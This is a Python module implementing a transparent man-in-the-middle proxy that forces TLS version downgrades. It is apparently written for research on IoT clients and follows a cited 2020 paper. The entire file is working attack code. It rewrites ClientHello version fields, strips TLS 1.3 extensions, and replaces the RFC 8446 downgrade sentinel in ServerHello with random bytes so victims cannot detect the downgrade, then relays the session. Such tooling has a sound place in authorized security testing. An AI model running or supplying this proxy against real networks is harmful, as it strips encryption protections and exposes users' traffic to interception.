"""
MITM TLS Downgrade Attack Simulator (Proof-of-Concept)

This module implements a transparent MITM proxy that intercepts TLS handshake
messages to force a version downgrade. It demonstrates the attack from:

  "Return of Version Downgrade Attack in the Era of TLS 1.3"
  (Cho et al., CoNEXT 2020, DOI: 10.1145/3386367.3431310)

The proxy performs TWO manipulations (matching the paper's methodology):

  1. ClientHello rewriting: Downgrades the version field from TLS 1.3 -> 1.2/1.0
     and removes the supported_versions extension so the server negotiates lower.

  2. ServerHello sentinel stripping: If the real server embeds the RFC 8446
     downgrade sentinel in ServerHello.random, the proxy REMOVES it before
     forwarding to the client. This tests whether the client detects the
     manipulation.

Architecture:
  IoT Client  <-->  [MITM Proxy]  <-->  Real Server (e.g. cloud API)

  Used to test IoT devices acting as TLS clients (cameras phoning home,
  NAS checking updates, smart hubs calling vendor APIs).

WARNING: For EDUCATIONAL / AUTHORIZED RESEARCH purposes only.
"""

import os
import select
import socket
import struct
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, List, Optional, Tuple

from src.utils.logger import get_logger

log = get_logger(__name__)

BUFFER_SIZE = 65536


TLS13_SENTINEL = b"DOWNGRD\x01"
TLS12_SENTINEL = b"DOWNGRD\x00"


@dataclass
class DowngradeEvent:
    timestamp: str
    client_addr: str
    original_version: str
    downgraded_version: str
    server_response: str
    success: bool
    sentinel_was_present: bool = False
    sentinel_stripped: bool = False
    client_detected_downgrade: bool = False
    details: str = ""


@dataclass
class SimulationResult:
    target_host: str
    target_port: int
    proxy_port: int
    events: List[DowngradeEvent] = field(default_factory=list)
    total_connections: int = 0
    successful_downgrades: int = 0
    blocked_downgrades: int = 0


def _version_bytes_to_name(version: int) -> str:
    names = {0x0300: "SSLv3", 0x0301: "TLS 1.0", 0x0302: "TLS 1.1",
             0x0303: "TLS 1.2", 0x0304: "TLS 1.3"}
    return names.get(version, f"0x{version:04X}")


def _strip_sentinel_from_server_hello(data: bytes) -> Tuple[bytes, bool, bool]:
    """
    Strip the RFC 8446 downgrade sentinel from a ServerHello's random bytes.

    Handles multi-record server responses by iterating through all TLS records
    and handshake messages to locate the ServerHello.

    Returns (modified_data, sentinel_was_present, was_modified).
    This is the second half of the Paper 1 attack: even if the real server
    correctly includes the sentinel, the MITM attacker removes it so the
    client cannot detect the downgrade.
    """
    result = bytearray(data)
    offset = 0

    while offset + 5 <= len(result):
        content_type = result[offset]
        record_len = struct.unpack("!H", result[offset + 3:offset + 5])[0]
        record_end = offset + 5 + record_len

        if record_end > len(result):
            break

        if content_type != 22:
            offset = record_end
            continue

        hs_offset = offset + 5
        while hs_offset + 4 <= record_end:
            hs_type = result[hs_offset]
            hs_len = struct.unpack("!I", b"\x00" + bytes(result[hs_offset + 1:hs_offset + 4]))[0]
            hs_body_start = hs_offset + 4

            if hs_type == 2:  # ServerHello
                random_start = hs_body_start + 2
                if random_start + 32 <= hs_body_start + hs_len:
                    tail_start = random_start + 24
                    tail = bytes(result[tail_start:tail_start + 8])
                    if tail == TLS13_SENTINEL or tail == TLS12_SENTINEL:
                        result[tail_start:tail_start + 8] = os.urandom(8)
                        return bytes(result), True, True
                    return bytes(result), False, False

            hs_offset = hs_body_start + hs_len

        offset = record_end

    return bytes(result), False, False


def _strip_tls13_extensions(payload: bytearray) -> bytearray:
    """Remove TLS 1.3-specific extensions from a ClientHello handshake payload.

    Strips these extensions so a TLS 1.3 server falls back to TLS 1.2:
      - supported_versions (0x002B): THE critical one -- servers use this for
        TLS 1.3 negotiation and ignore the legacy version field
      - key_share (0x0033): TLS 1.3 key exchange data
      - psk_key_exchange_modes (0x002D): TLS 1.3 PSK mode indicators

    Without these extensions, the server sees a standard TLS 1.2 ClientHello
    and negotiates TLS 1.2 (or lower) accordingly.
    """
    TLS13_EXT_TYPES = {0x002B, 0x0033, 0x002D}

    # Handshake payload layout:
    # [0]     handshake_type = 1 (ClientHello)
    # [1:4]   3-byte handshake body length
    # [4:6]   client_version
    # [6:38]  random (32 bytes)
    # [38]    session_id_length, then session_id bytes
    # [..]    cipher_suites_length (2), then cipher suites
    # [..]    compression_methods_length (1), then compression methods
    # [..]    extensions_length (2), then extensions
    offset = 4 + 2 + 32  # past type+length + version + random

    if offset >= len(payload):
        return payload

    sid_len = payload[offset]
    offset += 1 + sid_len

    if offset + 2 > len(payload):
        return payload
    cs_len = struct.unpack("!H", payload[offset:offset + 2])[0]
    offset += 2 + cs_len

    if offset >= len(payload):
        return payload
    comp_len = payload[offset]
    offset += 1 + comp_len

    if offset + 2 > len(payload):
        return payload

    ext_len_offset = offset
    ext_total = struct.unpack("!H", payload[offset:offset + 2])[0]
    offset += 2
    ext_start = offset
    ext_end = offset + ext_total

    # Walk through extensions, keeping everything except TLS 1.3 ones
    filtered = bytearray()
    pos = ext_start
    while pos + 4 <= ext_end:
        ext_type = struct.unpack("!H", payload[pos:pos + 2])[0]
        ext_len = struct.unpack("!H", payload[pos + 2:pos + 4])[0]
        ext_data = payload[pos:pos + 4 + ext_len]

        if ext_type not in TLS13_EXT_TYPES:
            filtered += ext_data

        pos += 4 + ext_len

    # Rebuild: everything before extensions + new extension block
    result = bytearray(payload[:ext_len_offset])
    result += struct.pack("!H", len(filtered))
    result += filtered

    # Update the 3-byte handshake body length at bytes [1:4]
    body_len = len(result) - 4
    result[1:4] = struct.pack("!I", body_len)[1:]

    return result


def _rewrite_client_hello(data: bytes, target_version: int = 0x0301) -> Tuple[bytes, Optional[int]]:
    """
    Rewrite a TLS ClientHello to force a version downgrade.

    Performs three modifications:
      1. Rewrite ClientHello.client_version to the target version
      2. Rewrite the record-layer version
      3. Strip TLS 1.3-specific extensions (supported_versions, key_share,
         psk_key_exchange_modes) so the server cannot negotiate TLS 1.3

    Returns (modified_data, original_version) or (original_data, None) on failure.
    """
    if len(data) < 11:
        return data, None

    content_type = data[0]
    if content_type != 22:  # Not handshake
        return data, None

    record_length = struct.unpack("!H", data[3:5])[0]
    payload = bytearray(data[5:5 + record_length])

    if len(payload) < 6 or payload[0] != 1:  # Not ClientHello
        return data, None

    original_version = struct.unpack("!H", payload[4:6])[0]

    # Step 1: Rewrite the legacy client_version field
    struct.pack_into("!H", payload, 4, target_version)

    # Step 2: Strip TLS 1.3 extensions (supported_versions, key_share, etc.)
    payload = _strip_tls13_extensions(payload)

    # Step 3: Rebuild the TLS record with updated lengths
    header = bytearray(5)
    header[0] = 22  # content_type = handshake
    struct.pack_into("!H", header, 1, min(target_version, 0x0301))
    struct.pack_into("!H", header, 3, len(payload))

    modified = bytes(header) + bytes(payload) + data[5 + record_length:]
    return modified, original_version


class DowngradeProxy:
    """
    A MITM proxy that intercepts the first TLS record (ClientHello)
    and rewrites the version to force a downgrade.
    """

    def __init__(self, target_host: str, target_port: int,
                 listen_port: int = 8443,
                 downgrade_to: int = 0x0301,
                 on_event: Optional[Callable[[DowngradeEvent], None]] = None):
        self.target_host = target_host
        self.target_port = target_port
        self.listen_port = listen_port
        self.downgrade_to = downgrade_to
        self.on_event = on_event
        self._server_sock: Optional[socket.socket] = None
        self._running = False
        self.result = SimulationResult(
            target_host=target_host,
            target_port=target_port,
            proxy_port=listen_port,
        )

    def start(self):
        """Start the proxy in a background thread."""
        self._running = True
        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.bind(("0.0.0.0", self.listen_port))
        self._server_sock.listen(10)
        self._server_sock.settimeout(1.0)

        self._thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._thread.start()
        log.info("Downgrade proxy listening on :%d -> %s:%d (target version: %s)",
                 self.listen_port, self.target_host, self.target_port,
                 _version_bytes_to_name(self.downgrade_to))

    def stop(self):
        """Stop the proxy."""
        self._running = False
        if self._server_sock:
            self._server_sock.close()
        log.info("Proxy stopped. %d connections, %d downgrades succeeded, %d blocked.",
                 self.result.total_connections,
                 self.result.successful_downgrades,
                 self.result.blocked_downgrades)

    def _accept_loop(self):
        while self._running:
            try:
                client_sock, client_addr = self._server_sock.accept()
                self.result.total_connections += 1
                t = threading.Thread(
                    target=self._handle_connection,
                    args=(client_sock, client_addr),
                    daemon=True,
                )
                t.start()
            except socket.timeout:
                continue
            except OSError:
                break

    def _handle_connection(self, client_sock: socket.socket, client_addr: Tuple[str, int]):
        from datetime import datetime, timezone
        addr_str = f"{client_addr[0]}:{client_addr[1]}"
        server_sock = None
        try:
            # Read the first TLS record from the client
            first_data = client_sock.recv(BUFFER_SIZE)
            if not first_data:
                return

            # Rewrite the ClientHello
            modified, original_ver = _rewrite_client_hello(first_data, self.downgrade_to)
            original_name = _version_bytes_to_name(original_ver) if original_ver else "Unknown"
            target_name = _version_bytes_to_name(self.downgrade_to)

            if original_ver:
                log.info("[%s] Intercepted ClientHello: %s -> rewriting to %s",
                         addr_str, original_name, target_name)

            # Connect to the real server and forward
            server_sock = socket.create_connection(
                (self.target_host, self.target_port), timeout=10
            )
            server_sock.sendall(modified)

            # Read server's response
            server_response = server_sock.recv(BUFFER_SIZE)
            if not server_response:
                event = DowngradeEvent(
                    timestamp=datetime.now(timezone.utc).isoformat(),
                    client_addr=addr_str,
                    original_version=original_name,
                    downgraded_version=target_name,
                    server_response="Connection closed",
                    success=False,
                    details="Server closed connection after receiving modified ClientHello.",
                )
                self.result.blocked_downgrades += 1
                self.result.events.append(event)
                if self.on_event:
                    self.on_event(event)
                return

            sentinel_was_present = False
            sentinel_stripped = False

            # Check if server sent an alert or a ServerHello
            if server_response[0] == 21:  # Alert
                alert_desc = server_response[6] if len(server_response) > 6 else -1
                success = False
                resp_str = f"Alert (description={alert_desc})"
                if alert_desc == 86:
                    details = "Server rejected with inappropriate_fallback -- SCSV protection active!"
                elif alert_desc == 70:
                    details = "Server sent protocol_version alert -- version not supported."
                else:
                    details = f"Server sent alert {alert_desc}."
                self.result.blocked_downgrades += 1
            elif server_response[0] == 22:  # Handshake (ServerHello)
                # Paper 1 attack step 2: strip the downgrade sentinel
                server_response, sentinel_was_present, sentinel_stripped = \
                    _strip_sentinel_from_server_hello(server_response)

                if sentinel_stripped:
                    log.info("[%s] Stripped downgrade sentinel from ServerHello!",
                             addr_str)

                success = True
                resp_str = "ServerHello accepted"
                details = (
                    f"Server accepted downgraded ClientHello ({target_name})."
                )
                if sentinel_stripped:
                    details += (
                        " Server had included the RFC 8446 sentinel but we stripped it. "
                        "Client must now detect the downgrade without the sentinel."
                    )
                elif not sentinel_was_present:
                    details += (
                        " Server did NOT include the sentinel -- "
                        "server itself lacks downgrade protection."
                    )
                self.result.successful_downgrades += 1
            else:
                success = False
                resp_str = f"Unknown (byte={server_response[0]})"
                details = "Unexpected server response."
                self.result.blocked_downgrades += 1

            event = DowngradeEvent(
                timestamp=datetime.now(timezone.utc).isoformat(),
                client_addr=addr_str,
                original_version=original_name,
                downgraded_version=target_name,
                server_response=resp_str,
                success=success,
                sentinel_was_present=sentinel_was_present,
                sentinel_stripped=sentinel_stripped,
                details=details,
            )
            self.result.events.append(event)
            if self.on_event:
                self.on_event(event)

            # Forward the (possibly modified) ServerHello to the client
            client_sock.sendall(server_response)

            # Monitor if the client sends an alert (detected the attack)
            try:
                client_sock.settimeout(3.0)
                client_reply = client_sock.recv(BUFFER_SIZE)
                if client_reply and client_reply[0] == 21:
                    event.client_detected_downgrade = True
                    event.details += " CLIENT DETECTED the downgrade and sent an alert!"
                    log.info("[%s] Client detected downgrade (sent alert)", addr_str)
                elif client_reply:
                    event.client_detected_downgrade = False
                    event.details += " Client continued handshake -- VULNERABLE."
                    # Continue relaying
                    server_sock.sendall(client_reply)
                    self._relay(client_sock, server_sock)
            except socket.timeout:
                event.details += " Client did not respond (may have dropped connection)."

        except Exception as exc:
            log.error("[%s] Error: %s", addr_str, exc)
        finally:
            client_sock.close()
            if server_sock:
                server_sock.close()

    @staticmethod
    def _relay(sock_a: socket.socket, sock_b: socket.socket, timeout: float = 30.0):
        """Bidirectional relay between two sockets."""
        sockets = [sock_a, sock_b]
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                readable, _, _ = select.select(sockets, [], [], 1.0)
            except (ValueError, OSError):
                break
            for s in readable:
                try:
                    data = s.recv(BUFFER_SIZE)
                    if not data:
                        return
                    dest = sock_b if s is sock_a else sock_a
                    dest.sendall(data)
                except (OSError, ConnectionError):
                    return


def run_simulation(target_host: str, target_port: int,
                   proxy_port: int = 8443,
                   downgrade_to: int = 0x0301,
                   duration: float = 60.0,
                   on_event: Optional[Callable] = None) -> SimulationResult:
    """
    Run the downgrade proxy for a given duration, then stop and return results.
    Useful for automated testing: start the proxy, run a client against it,
    then collect findings.
    """
    proxy = DowngradeProxy(
        target_host, target_port, proxy_port, downgrade_to, on_event
    )
    proxy.start()
    log.info("Simulation running for %.0f seconds ...", duration)
    time.sleep(duration)
    proxy.stop()
    return proxy.result
